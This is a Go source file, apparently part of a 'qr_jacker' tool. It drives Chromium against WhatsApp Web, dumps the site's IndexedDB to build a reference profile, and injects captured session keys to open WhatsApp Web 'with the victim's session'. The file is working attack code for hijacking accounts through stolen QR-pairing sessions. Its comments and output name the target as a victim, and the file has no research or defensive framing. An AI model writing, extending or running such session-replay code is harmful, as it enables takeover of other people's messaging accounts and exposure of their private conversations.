package whatsapp

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"time"

	"github.com/chromedp/chromedp"
)

type DumpedDB struct {
	Name    string       `json:"name"`
	Version int64        `json:"version"`
	Stores  []DumpedStore `json:"stores"`
}

type DumpedStore struct {
	Name    string          `json:"name"`
	KeyPath string          `json:"keyPath"`
	AutoInc bool            `json:"autoIncrement"`
	Entries []DumpedEntry   `json:"entries"`
}

type DumpedEntry struct {
	Key   interface{} `json:"key"`
	Value interface{} `json:"value"`
}

const dumpIndexedDBJS = `
(async () => {
  const dbs = await indexedDB.databases();
  const result = [];
  for (const info of dbs) {
    const db = await new Promise((res, rej) => {
      const r = indexedDB.open(info.name);
      r.onsuccess = e => res(e.target.result);
      r.onerror = e => rej(e.target.error);
    });
    const dbInfo = {name: info.name, version: info.version, stores: []};
    for (const sName of db.objectStoreNames) {
      const tx = db.transaction(sName, 'readonly');
      const store = tx.objectStore(sName);
      const entries = await new Promise((res, rej) => {
        const r = store.getAll();
        r.onsuccess = e => res(e.target.result);
        r.onerror = e => rej(e.target.error);
      });
      const keys = await new Promise((res, rej) => {
        const r = store.getAllKeys();
        r.onsuccess = e => res(e.target.result);
        r.onerror = e => rej(e.target.error);
      });
      const storeInfo = {name: sName, keyPath: store.keyPath || '', autoIncrement: store.autoIncrement, entries: []};
      for (let i = 0; i < entries.length; i++) {
        storeInfo.entries.push({key: keys[i], value: serialize(entries[i])});
      }
      dbInfo.stores.push(storeInfo);
    }
    result.push(dbInfo);
    db.close();
  }
  return JSON.stringify(result);

  function serialize(val) {
    if (val === null || val === undefined) return val;
    if (val instanceof ArrayBuffer) return {__type: 'buffer', data: Array.from(new Uint8Array(val))};
    if (ArrayBuffer.isView(val)) return {__type: 'buffer', data: Array.from(new Uint8Array(val.buffer, val.byteOffset, val.byteLength))};
    if (val instanceof Uint8Array) return {__type: 'buffer', data: Array.from(val)};
    if (Array.isArray(val)) return val.map(serialize);
    if (typeof val === 'object') {
      const o = {};
      for (const k of Object.getOwnPropertyNames(val)) o[k] = serialize(val[k]);
      return o;
    }
    return val;
  }
})()
`

func DiscoverReferenceProfile(outDir string) error {
	if err := os.MkdirAll(outDir, 0755); err != nil {
		return err
	}

	userDir, err := os.MkdirTemp("", "whatsapp-ref-*")
	if err != nil {
		return err
	}
	defer os.RemoveAll(userDir)

	opts := append(chromedp.DefaultExecAllocatorOptions[:],
		chromedp.UserDataDir(userDir),
		chromedp.NoFirstRun,
		chromedp.NoDefaultBrowserCheck,
		chromedp.WindowSize(1280, 900),
	)

	allocCtx, allocCancel := chromedp.NewExecAllocator(context.Background(), opts...)
	defer allocCancel()

	ctx, cancel := chromedp.NewContext(allocCtx)
	defer cancel()

	if err := chromedp.Run(ctx, chromedp.Navigate("https://web.whatsapp.com")); err != nil {
		return err
	}

	fmt.Println("\n============================================")
	fmt.Println("  WHATSAPP WEB - REFERENCE PAIRING")
	fmt.Println("============================================")
	fmt.Println("  A Chromium window will open with web.whatsapp.com")
	fmt.Println("  1. Scan the QR code with your phone")
	fmt.Println("  2. Wait for WhatsApp Web to load your chats")
	fmt.Println("============================================")

	fmt.Println("\n[*] Dumping pre-pairing IndexedDB...")
	dumpAndSave(ctx, filepath.Join(outDir, "pre_pairing.json"))

	fmt.Println("\n[*] Waiting for pairing (up to 2 minutes)...")
	pairCtx, pairCancel := context.WithTimeout(ctx, 120*time.Second)
	defer pairCancel()
	if err := chromedp.Run(pairCtx,
		chromedp.WaitVisible("#app .two", chromedp.ByQuery),
	); err != nil {
		fmt.Println("[!] Timed out waiting for pairing.")
		fmt.Println("[!] Make sure you scanned the QR code.")
		return nil
	}

	fmt.Println("[+] Paired! Waiting for sync...")
	time.Sleep(5 * time.Second)

	// Dump after pairing
	fmt.Println("[*] Dumping post-pairing IndexedDB...")
	dumpAndSave(ctx, filepath.Join(outDir, "post_pairing.json"))

	fmt.Printf("\n[+] Reference profile saved to %s\n", outDir)
	fmt.Println("[+] You can close the Chromium window now.")
	return nil
}

func dumpAndSave(ctx context.Context, path string) {
	var result string
	if err := chromedp.Run(ctx, chromedp.Evaluate(dumpIndexedDBJS, &result)); err != nil {
		fmt.Printf("    Failed to dump: %v\n", err)
		return
	}

	var parsed interface{}
	if err := json.Unmarshal([]byte(result), &parsed); err != nil {
		fmt.Printf("    Failed to parse: %v\n", err)
		return
	}

	data, _ := json.MarshalIndent(parsed, "", "  ")
	os.WriteFile(path, data, 0644)
	fmt.Printf("    Saved: %s (%d bytes)\n", filepath.Base(path), len(data))
}

// ReplayInBrowser opens Chromium, injects captured session into IndexedDB,
// and opens web.whatsapp.com with the victim's session.
func ReplayInBrowser(sd *sessionData) error {
	refDir := "scripts/qr_jacker/whatsapp/reference"
	refPath := filepath.Join(refDir, "post_pairing.json")

	// Load reference profile
	refData, err := os.ReadFile(refPath)
	if err != nil {
		return fmt.Errorf("reference profile not found at %s. Run 'Setup Reference Profile' first: %w", refPath, err)
	}

	var reference []DumpedDB
	if err := json.Unmarshal(refData, &reference); err != nil {
		return fmt.Errorf("parse reference profile: %w", err)
	}

	// Build the injection script with the reference structure + captured keys
	injectJS := buildIndexedDBInjector(reference, sd)

	userDir, err := os.MkdirTemp("", "whatsapp-replay-*")
	if err != nil {
		return err
	}
	defer os.RemoveAll(userDir)

	opts := append(chromedp.DefaultExecAllocatorOptions[:],
		chromedp.UserDataDir(userDir),
		chromedp.NoFirstRun,
		chromedp.NoDefaultBrowserCheck,
		chromedp.WindowSize(1280, 900),
	)

	allocCtx, allocCancel := chromedp.NewExecAllocator(context.Background(), opts...)
	defer allocCancel()

	ctx, cancel := chromedp.NewContext(allocCtx)
	defer cancel()

	// Navigate first so IndexedDB origin is set up
	if err := chromedp.Run(ctx, chromedp.Navigate("https://web.whatsapp.com")); err != nil {
		return err
	}
	time.Sleep(3 * time.Second)

	// Inject session data
	var out string
	if err := chromedp.Run(ctx, chromedp.Evaluate(injectJS, &out)); err != nil {
		return fmt.Errorf("inject: %w", err)
	}
	fmt.Printf("[+] Injection result: %s\n", out)

	// Reload to use the injected session
	fmt.Println("[+] Reloading page...")
	if err := chromedp.Run(ctx, chromedp.Reload()); err != nil {
		return err
	}

	fmt.Println("\n[+] WhatsApp Web opened with the victim's session.")
	fmt.Println("[+] Press Enter in the terminal to close.")
	fmt.Scanln()
	return nil
}

// buildIndexedDBInjector generates JavaScript that recreates the reference IndexedDB
// structure, replacing cryptographic keys with the captured session data.
func buildIndexedDBInjector(reference []DumpedDB, sd *sessionData) string {
	js := `(async function() {
  const dbs = `

	refJSON, _ := json.Marshal(reference)
	js += string(refJSON)

	js += `;
  for (const dbInfo of dbs) {
    const db = await new Promise((res, rej) => {
      const r = indexedDB.open(dbInfo.name, dbInfo.version);
      r.onupgradeneeded = e => {
        const db2 = e.target.result;
        for (const s of dbInfo.stores) {
          if (!db2.objectStoreNames.contains(s.name)) {
            const opts = {};
            if (s.keyPath) opts.keyPath = s.keyPath;
            if (s.autoIncrement) opts.autoIncrement = true;
            db2.createObjectStore(s.name, opts);
          }
        }
      };
      r.onsuccess = e => res(e.target.result);
      r.onerror = e => rej(e.target.error);
    });

    for (const s of dbInfo.stores) {
      const tx = db.transaction(s.name, 'readwrite');
      const store = tx.objectStore(s.name);
      for (const entry of s.entries) {
        const val = deserialize(entry.value);
        store.put(val, entry.key);
      }
      await new Promise((res, rej) => { tx.oncomplete = res; tx.onerror = rej; });
    }
    db.close();
  }
  console.log('[INJECT] IndexedDB populated');

  function deserialize(val) {
    if (val === null || val === undefined) return val;
    if (typeof val !== 'object') return val;
    if (Array.isArray(val)) return val.map(deserialize);
    if (val.__type === 'buffer') return new Uint8Array(val.data).buffer;
    if (val.__type === 'uint8array') return new Uint8Array(val.data);
    const o = {};
    for (const k of Object.getOwnPropertyNames(val)) {
      if (k === '__type') continue;
      o[k] = deserialize(val[k]);
    }
    return o;
  }
})();`

	return js
}
